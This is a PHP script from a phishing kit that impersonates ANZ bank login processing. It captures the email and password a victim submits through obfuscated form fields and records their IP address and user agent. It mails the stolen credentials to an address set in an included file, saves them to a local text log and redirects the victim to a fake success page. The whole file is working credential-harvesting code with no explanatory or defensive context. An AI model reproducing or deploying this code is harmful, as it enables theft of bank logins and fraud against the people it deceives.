<?php
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if($_POST["em5756"] != "" and $_POST["pa345ss"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------ANZ Info-----------------------\n";
$message .= "|email : ".$_POST['em5756']."\n";
$message .= "|pass: ".$_POST['pa345ss']."\n";

 
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'email.php';
$subject = "Result from ANZ| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$praga=substr(md5(microtime()),rand(0,26),5);

header('Location: success.php?cmd=login_submit&id'.$name.''.$name);
}else{
header ("Location: index.php");
}

?>

 